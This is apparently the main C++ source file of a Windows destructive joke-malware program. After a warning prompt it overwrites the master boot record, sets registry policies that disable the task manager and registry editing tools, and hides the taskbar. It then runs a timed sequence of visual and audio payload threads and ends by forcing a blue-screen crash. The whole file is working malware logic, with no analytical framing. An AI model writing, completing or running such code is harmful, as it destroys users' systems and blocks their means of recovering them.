#include "payloads.h"
#include "sounds.h"
using namespace Payloads;
using namespace Sounds;

int main() {
    srand(time(0));

    if (Warning()) {
    OverwriteMBR();
    Regedit(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskmgr", REG_DWORD, 1);
    Regedit(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);
    MoveSelf();
    HideTaskbar();
    
    ClearScreen();

    Sleep(1000 * 12);
    
    HANDLE thread0 = CreateThread(0, 0, payload0, 0, 0, 0);
    audio0();
    Sleep(1000 * 25);
    TerminatePayload(thread0);
    
    ClearScreen();

    HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
    audio1();
    Sleep(1000 * 35);
    TerminatePayload(thread1);

    ClearScreen();

    HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
    audio2();
    Sleep(1000 * 35);
    TerminatePayload(thread2);

    ClearScreen();

    HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
    audio3();
    Sleep(1000 * 35);
    TerminatePayload(thread3);

    ClearScreen();

    HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
    audio4();
    Sleep(1000 * 35);
    TerminatePayload(thread4);

    ClearScreen();

    HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
    HANDLE thread_pie = CreateThread(0, 0, moving_pie, 0, 0, 0);
    audio5();
    Sleep(1000 * 35);
    TerminatePayload(thread5);

    ClearScreen();

    HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
    audio6();
    Sleep(1000 * 25);
    TerminatePayload(thread6);
    ClearScreen();
    HANDLE thread6_2 = CreateThread(0, 0, payload6_2, 0, 0, 0);
    Sleep(1000 * 25);
    TerminatePayload(thread_pie);
    TerminatePayload(thread6_2);

    ClearScreen();

    HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
    audio7();
    Sleep(1000 * 35);
    TerminatePayload(thread7);

    ClearScreen();

    HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
    audio8();
    Sleep(1000 * 35);
    TerminatePayload(thread8);

    ClearScreen();

    HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
    audio9();
    Sleep(1000 * 45);
    TerminatePayload(thread9);

    ClearScreen();

    HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
    audio10();
    Sleep(1000 * 30);
    BSOD();
    Sleep(-1);
    } else 
    {
    ExitProcess(0);
    }
}